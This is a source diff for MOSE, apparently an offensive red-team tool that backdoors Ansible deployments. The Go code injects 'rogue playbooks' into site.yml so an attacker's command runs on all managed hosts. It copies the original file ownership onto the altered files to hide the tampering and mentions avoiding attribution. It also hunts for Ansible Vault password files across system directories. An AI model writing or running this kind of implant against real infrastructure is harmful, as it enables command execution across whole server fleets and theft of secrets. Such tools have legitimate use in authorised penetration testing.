@@ -14,10 +14,10 @@ import (
 	"strings"
 	"text/template"
 
-	"github.com/CrimsonK1ng/mose/pkg/moseutils"
 	"github.com/ghodss/yaml"
 	"github.com/gobuffalo/packr/v2"
 	utils "github.com/l50/goutils"
+	"github.com/master-of-servers/mose/pkg/moseutils"
 )
 
 type command struct {
@@ -34,16 +34,23 @@ type ansibleFiles struct {
 	playbookDirs []string
 	siteFile     string
 	vaultFile    string
+	uid          int
+	gid          int
 }
 
 type ansible []struct {
-	Name        string        `json:"name,omitempty"`
-	Hosts       string        `json:"hosts,omitempty"`
-	Become      bool          `json:"become,omitempty"`
-	GatherFacts string        `json:"gather_facts,omitempty"`
-	Include     string        `json:"include,omitempty"`
-	Roles       []string      `json:"roles,flow,omitempty"`
-	Tasks       []interface{} `json:"tasks,omitempty"`
+	Name         string                 `json:"name,omitempty"`
+	Connection   interface{}            `json:"connection,omitempty"`
+	Vars         map[string]interface{} `json:"vars,omitempty,flow"`
+	Remote       string                 `json:"remote_user,omitempty"`
+	BecomeMethod string                 `json:"become_method,omitempty"`
+	Hosts        string                 `json:"hosts,omitempty"`
+	Become       bool                   `json:"become,omitempty"`
+	GatherFacts  string                 `json:"gather_facts,omitempty"`
+	Include      string                 `json:"include,omitempty"`
+	Tags         []interface{}          `json:"tags,omitempty,flow"`
+	Roles        []interface{}          `json:"roles,flow,omitempty"`
+	Tasks        []interface{}          `json:"tasks,flow,omitempty"`
 }
 
 var (
@@ -58,6 +65,8 @@ var (
 		playbookDirs: []string{},
 		siteFile:     "",
 		vaultFile:    "",
+		uid:          -1,
+		gid:          -1,
 	}
 	osTarget       = a.OsTarget
 	ansibleRole    = a.PayloadName
@@ -73,9 +82,9 @@ func init() {
 
 func doCleanup(siteLoc string) {
 	moseutils.TrackChanges(cleanupFile, cleanupFile)
-	ans, err := moseutils.AskUserQuestion("Would you like to remove all files associated with a previous run?", osTarget)
+	ans, err := moseutils.AskUserQuestion("Would you like to remove all files associated with a previous run? ", osTarget)
 	if err != nil {
-		log.Fatal("Quitting...")
+		log.Fatalln(err)
 	}
 	moseutils.RemoveTracker(cleanupFile, osTarget, ans)
 
@@ -225,7 +234,7 @@ func createPlaybookDirs(playbookDir string, ansibleCommand command) {
 	err = os.MkdirAll(filepath.Join(playbookDir, ansibleCommand.CmdName, "tasks"), os.ModePerm)
 
 	if err != nil {
-		log.Fatalf("Error creating the %s playbook directory: %v", playbookDir, err)
+		log.Printf("Error creating the %s playbook directory: %v", playbookDir, err)
 	}
 
 	if uploadFileName != "" {
@@ -233,7 +242,7 @@ func createPlaybookDirs(playbookDir string, ansibleCommand command) {
 		err = os.MkdirAll(fileDir, os.ModePerm)
 
 		if err != nil {
-			log.Fatalf("Error creating the %s playbook directory: %v", fileDir, err)
+			log.Printf("Error creating the %s playbook directory: %v", fileDir, err)
 		}
 
 		_, err := moseutils.TrackChanges(cleanupFile, uploadFilePath)
@@ -244,9 +253,9 @@ func createPlaybookDirs(playbookDir string, ansibleCommand command) {
 
 		moseutils.CpFile(uploadFilePath, filepath.Join(fileDir, filepath.Base(uploadFileName)))
 		if err := os.Chmod(filepath.Join(fileDir, filepath.Base(uploadFileName)), 0644); err != nil {
-			log.Fatal(err)
+			log.Printf("Failed to set the permissions for %v: %v", uploadFileName, err)
 		}
-		moseutils.Msg("Successfully copied and chmod file %s", filepath.Join(fileDir, filepath.Base(uploadFileName)))
+		moseutils.Msg("Successfully copied and set permissions for %s", filepath.Join(fileDir, filepath.Base(uploadFileName)))
 	}
 }
 
@@ -258,15 +267,21 @@ func backupSiteFile() {
 		err = os.MkdirAll(ansibleBackupLoc, os.ModePerm)
 
 		if err != nil {
-			log.Fatalf("Error creating the path (%s) for the backup: %v", path, err)
+			log.Printf("Error creating the path (%s) for the backup: %v", path, err)
 		}
 
 		path = filepath.Join(ansibleBackupLoc, filepath.Base(files.siteFile))
 	}
 	if !moseutils.FileExists(path + ".bak.mose") {
 		moseutils.CpFile(files.siteFile, path+".bak.mose")
+		if files.uid != -1 && files.gid != -1 {
+			err := os.Chown(path+".bak.mose", files.uid, files.gid)
+			if err != nil {
+				moseutils.ErrMsg("issues changing owner of backup file")
+			}
+		}
 	} else {
-		moseutils.ErrMsg("Backup of the (%v.bak.mose) already exists.", path)
+		moseutils.ErrMsg("Backup of the site.yml file already exists (%v.bak.mose), moving on.", path)
 	}
 }
 
@@ -286,14 +301,14 @@ func generatePlaybooks() {
 		s, err := box.FindString("ansiblePlaybook.tmpl")
 
 		if err != nil {
-			log.Fatalf("Error reading the template to create a playbook: %v", err)
+			log.Fatalf("Error reading the template to create a playbook: %v, exiting...", err)
 		}
 
 		if uploadFileName != "" {
 			s, err = box.FindString("ansibleFileUploadPlaybook.tmpl")
 
 			if err != nil {
-				log.Fatalf("Error reading the template to create a playbook: %v", err)
+				log.Fatalf("Error reading the file upload template to create a playbook: %v, exiting...", err)
 			}
 		}
 
@@ -301,14 +316,14 @@ func generatePlaybooks() {
 		t, err := template.New("ansiblePlaybook").Parse(s)
 
 		if err != nil {
-			log.Fatalf("Error creating the template representation of the ansible playbook: %v", err)
+			log.Fatalf("Error creating the template representation of the ansible playbook: %v, exiting...", err)
 		}
 
 		// Create the main.yml file
 		f, err := os.Create(filepath.Join(playbookDir, ansibleCommand.CmdName, "tasks", "main.yml"))
 
 		if err != nil {
-			log.Fatalln(err)
+			log.Fatalf("Error creating the main.yml file: %v, exiting...", err)
 		}
 
 		// Write the contents of ansibleCommand into the main.yml file generated previously
@@ -323,12 +338,67 @@ func generatePlaybooks() {
 			log.Printf("Creating rogue playbook %s", playbookDir)
 		}
 		moseutils.Msg("Successfully created the %s playbook at %s", ansibleCommand.CmdName, playbookDir)
+
+		_, err = moseutils.TrackChanges(cleanupFile, filepath.Join(playbookDir, ansibleCommand.CmdName))
+
+		if err != nil {
+			moseutils.ErrMsg("Error tracking changes: ", err)
+		}
+
+		if debug {
+			log.Printf("Attempting to change ownership of directory")
+		}
+		if files.uid != -1 && files.gid != -1 {
+			err := moseutils.ChownR(filepath.Join(playbookDir, ansibleCommand.CmdName), files.uid, files.gid)
+			if err != nil {
+				moseutils.ErrMsg("issues changing owner of backup file")
+			}
+		}
 	}
 }
 
-func backdoorSiteFile() {
-	bytes, err := moseutils.ReadBytesFromFile(files.siteFile)
+func writeYamlToSite(siteYaml ansible) {
+	marshalled, err := yaml.Marshal(&siteYaml)
+	if err != nil {
+		log.Fatal(err)
+	}
 
+	err = moseutils.WriteBytesToFile(files.siteFile, marshalled, 0644)
+	if err != nil {
+		log.Fatalf("Error writing %v to %v because of: %v, exiting.", marshalled, files.siteFile, err)
+	}
+	moseutils.Msg("Added backdoored code to %s", files.siteFile)
+}
+
+func validateIndicies(data ansible) map[int]bool {
+	validIndices := make(map[int]bool, 0)
+	for i, hosts := range data {
+		roles := make([]string, 0)
+		if hosts.Include == "" {
+			for _, item := range hosts.Roles {
+				switch r := item.(type) {
+				case map[string]interface{}:
+					roles = append(roles, r["role"].(string))
+				case string:
+					roles = append(roles, r)
+				default:
+					if debug {
+						log.Println("Should not make it here in validateIndicies")
+					}
+				}
+			}
+			moseutils.Msg("[%v] Name: %v, Hosts: %v, Roles: %v", i, hosts.Name, hosts.Hosts, roles)
+			validIndices[i] = true
+		}
+	}
+	return validIndices
+}
+
+func backdoorSiteFile() {
+	var hosts []string
+	hostAllFound := false
+
+	bytes, err := moseutils.ReadBytesFromFile(files.siteFile)
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -338,9 +408,6 @@ func backdoorSiteFile() {
 	if err != nil {
 		log.Fatal(err)
 	}
-
-	var hosts []string
-	hostAllFound := false
 
 	for _, host := range unmarshalled {
 		hosts = append(hosts, host.Hosts)
@@ -353,13 +420,12 @@ func backdoorSiteFile() {
 		if debug {
 			log.Println("hosts:all found")
 		}
-		if ans, err := moseutils.AskUserQuestion("Backdoor the step containing hosts:all?", a.OsTarget); ans && err == nil {
+		if ans, err := moseutils.AskUserQuestion("Would you like to target all managed hosts? ", a.OsTarget); ans && err == nil {
 			for i, item := range unmarshalled {
 				if strings.Compare(item.Hosts, "all") == 0 {
-
-					moseutils.Msg("'Hosts: all' found, appending playbook to roles")
+					moseutils.Msg("Existing configuration for all hosts found, adding rogue playbook to associated roles")
 					if unmarshalled[i].Roles == nil {
-						unmarshalled[i].Roles = make([]string, 0)
+						unmarshalled[i].Roles = make([]interface{}, 0)
 					}
 					unmarshalled[i].Roles = append(unmarshalled[i].Roles, ansibleRole)
 					writeYamlToSite(unmarshalled)
@@ -373,59 +439,49 @@ func backdoorSiteFile() {
 
 	if !hostAllFound {
 		if debug {
-			log.Println("No hosts:all found in site.yml")
+			log.Printf("No existing configuration for all founds host in %v", files.siteFile)
 		}
-		if ans, err := moseutils.AskUserQuestion("Would you like to inject a hosts: all into the site.yml?", a.OsTarget); ans && err == nil {
+		roles := make([]interface{}, 0)
+		roles = append(roles, ansibleRole)
+		if ans, err := moseutils.AskUserQuestion("Would you like to target all managed nodes? ", a.OsTarget); ans && err == nil {
 			newItem := ansible{{
-				"Important Do Not Remove",
+				a.PayloadName,
+				nil,
+				nil,
+				"",
+				"",
 				"all",
 				true,
 				"",
 				"",
-				[]string{ansibleRole},
+				nil,
+				roles,
 				nil,
 			}}
 			unmarshalled = append(unmarshalled, newItem[0])
 			writeYamlToSite(unmarshalled)
 			return
 		} else if err != nil {
-			log.Fatalf("Quitting...")
+			log.Fatalf("Error targeting all managed nodes: %v, exiting.", err)
 		}
 	}
-	moseutils.Info("The following steps were found in the site.yml file:")
-	validIndex := make(map[int]bool, 0)
-	for i, hosts := range unmarshalled {
-		if hosts.Include == "" {
-			moseutils.Msg("[%v] Name: %v, Hosts: %v, Roles: %v", i, hosts.Name, hosts.Hosts, hosts.Roles)
-			validIndex[i] = true
-		}
+	moseutils.Info("The following roles were found in the site.yml file: ")
+	validIndices := validateIndicies(unmarshalled)
 
-	}
-
-	if ans, err := moseutils.AskUserQuestionCommaIndex("Provide index of steps you would like to inject in the site.yml (ex. 1,3,...)", a.OsTarget, validIndex); err == nil {
+	if ans, err := moseutils.IndexedUserQuestion("Provide the index of the location that you want to inject into the site.yml (ex. 1,3,...):", a.OsTarget, validIndices, func() { validateIndicies(unmarshalled) }); err == nil {
 		for i := range unmarshalled {
-			if ans[i] { // Check if current step in answer
+			// Check if the specified location is in the answer
+			if ans[i] {
 				if unmarshalled[i].Roles == nil {
-					unmarshalled[i].Roles = make([]string, 0)
+					unmarshalled[i].Roles = make([]interface{}, 0)
 				}
 				unmarshalled[i].Roles = append(unmarshalled[i].Roles, ansibleRole)
 			}
 		}
 	} else if err != nil {
-		log.Fatalf("Quitting...")
+		log.Fatalf("Failure injecting into the site.yml file: %v, exiting.", err)
 	}
 	writeYamlToSite(unmarshalled)
-
-	// find the hosts: all section
-	// if it doesn't exist, create it
-	// make sure to put the backdoor at the bottom of roles
-	// be sure to support cases like this: https://raw.githubusercontent.com/l50/ansible-docker-compose/master/ansible/site.yml
-	// where there are no roles
-	// if there are no roles, then add a roles section to the yaml file under the hosts: all section
-	// files to test with:
-	// https://raw.githubusercontent.com/l50/ansible-docker-compose/master/ansible/site.yml
-	// https://raw.githubusercontent.com/ansible/ansible-examples/master/mongodb/site.yml
-	// https://github.com/ansible/ansible-examples/blob/master/lamp_haproxy/site.yml
 }
 
 func findVaultSecrets() {
@@ -434,7 +490,7 @@ func findVaultSecrets() {
 		envPass := os.Getenv("ANSIBLE_VAULT_PASSWORD_FILE")
 		envFileExists, envFile := getVaultPassFromCfg()
 
-		ansibleFiles, _ := moseutils.FindFiles([]string{"/etc/ansible", "/root", "/home", "/opt", "/var"}, []string{".yaml", ".yml"}, []string{"vault"}, []string{}, debug)
+		ansibleFiles, _ := moseutils.FindFiles([]string{"/etc/ansible", "/root", "/home", "/opt", "/var"}, []string{".yaml", ".yml"}, []string{"vault"}, []string{})
 
 		if len(ansibleFiles) == 0 {
 			moseutils.ErrMsg("Unable to find any yaml files")
@@ -505,24 +561,7 @@ func getVaultPassFromCfg() (bool, string) {
 	return false, ""
 }
 
-func writeYamlToSite(siteYaml ansible) {
-	marshalled, err := yaml.Marshal(&siteYaml)
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	err = moseutils.WriteFile(files.siteFile, marshalled, 0644)
-	if err != nil {
-		log.Fatalf("error: %v", err)
-	}
-	moseutils.Msg("%s successfully created", files.siteFile)
-}
-
 func main() {
-	if cleanup {
-		doCleanup(files.siteFile)
-	}
-
 	if uploadFileName != "" {
 		moseutils.CpFile(uploadFileName, uploadFilePath)
 		_, err := moseutils.TrackChanges(cleanupFile, uploadFileName)
@@ -536,6 +575,18 @@ func main() {
 	files.siteFile = getSiteFile()
 	if debug {
 		log.Printf("Site file: %v", files.siteFile)
+	}
+
+	uid, gid, err := moseutils.GetUIDGid(files.siteFile)
+	if err != nil {
+		moseutils.ErrMsg("Error retrieving uid and gid of file, will default to root")
+	}
+
+	files.uid = uid
+	files.gid = gid
+
+	if cleanup {
+		doCleanup(files.siteFile)
 	}
 
 	// Find ansible.cfg
@@ -558,28 +609,37 @@ func main() {
 
 	// Parse managed systems from the hosts files found previously
 	files.hosts = getManagedSystems()
-	if debug {
-		log.Printf("Managed systems found: %v", files.hosts)
+	if len(files.hosts) > 0 {
+		moseutils.Info("The following managed systems were found: %v", files.hosts)
 	}
 
 	if files.siteFile != "" {
 		if ans, err := moseutils.AskUserQuestion("Do you want to create a backup of the manifests? This can lead to attribution, but can save your bacon if you screw something up or if you want to be able to automatically clean up. ", a.OsTarget); ans && err == nil {
 			backupSiteFile()
 		} else if err != nil {
-			moseutils.ErrMsg("Error backing up %s: %v, exiting...", files.siteFile, err)
+			log.Fatal("Exiting...")
 		}
 	}
 
 	// Create rogue playbooks using ansiblePlaybook.tmpl
 	generatePlaybooks()
 
-	moseutils.Msg("Backdooring %s to run %s on all managed systems, please wait...", files.siteFile, a.Cmd)
+	moseutils.Msg("Backdooring %v to run %s on all managed systems, please wait...", files.siteFile, a.Cmd)
 	backdoorSiteFile()
+
+	if debug {
+		fmt.Printf("Changing owner of the backup file to uid %v\n", files.uid)
+	}
+	if files.uid != -1 && files.gid != -1 {
+		err := os.Chown(files.siteFile, files.uid, files.gid)
+		if err != nil {
+			log.Printf("Failed to change owner of the backup file: %v\n", err)
+		}
+	}
 
 	// find secrets is ansible-vault is installed
 	moseutils.Info("Attempting to find secrets, please wait...")
 	findVaultSecrets()
 	moseutils.Msg("MOSE has finished, exiting.")
 	os.Exit(0)
-
 }
